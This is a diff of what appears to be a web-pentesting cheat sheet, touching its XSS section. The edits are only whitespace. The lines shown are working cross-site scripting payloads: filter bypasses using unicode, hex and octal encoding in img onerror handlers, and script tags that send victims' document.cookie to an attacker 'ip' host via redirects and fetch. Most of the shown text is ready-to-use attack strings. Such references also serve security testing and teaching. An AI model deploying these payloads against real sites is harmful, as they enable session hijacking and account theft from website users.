@@ -214,7 +214,7 @@ e.g.
 ### Other bypass techniques
 
 -> unicode  
-`<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)"/> `
+`<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)"/>`  
 
 Add execution sink:  
 -> eval  
@@ -226,11 +226,11 @@ Add execution sink:
 -> hexadecimal  
 `<img src=x onerror="setInterval('\x61lert(1)')"/>`  
 -> mix  (uni, hex, octa)  
-`<img src=x onerror="setTimeout('\x61\154\145\x72\164\x28\x31\x29')"/>`
+`<img src=x onerror="setTimeout('\x61\154\145\x72\164\x28\x31\x29')"/>`  
 
 https://checkserp.com/encode/unicode/  
-http://www.unit-conversion.info/texttools/octal/
-http://www.unit-conversion.info/texttools/hexadecimal/
+http://www.unit-conversion.info/texttools/octal/  
+http://www.unit-conversion.info/texttools/hexadecimal/  
 
 ### Others Examples
 #### HTML Tag
@@ -298,9 +298,9 @@ https://malwaredecoder.com/
 -> Examples
   
 `<script type=“text/javascript”>document.location=“http://ip/?cookie=“+document.cookie;</script>`  
-`<script>window.location="http://ip/?cookie="+document.cookie;</script>`
-`<script>document.location="http://ip/?cookie="+document.cookie;</script>`
-`<script>fetch('https://ip/?cookie=' + btoa(document.cookie));</script>`
+`<script>window.location="http://ip/?cookie="+document.cookie;</script>`  
+`<script>document.location="http://ip/?cookie="+document.cookie;</script>`  
+`<script>fetch('https://ip/?cookie=' + btoa(document.cookie));</script>`  
 ## Type Juggling
 
 https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf
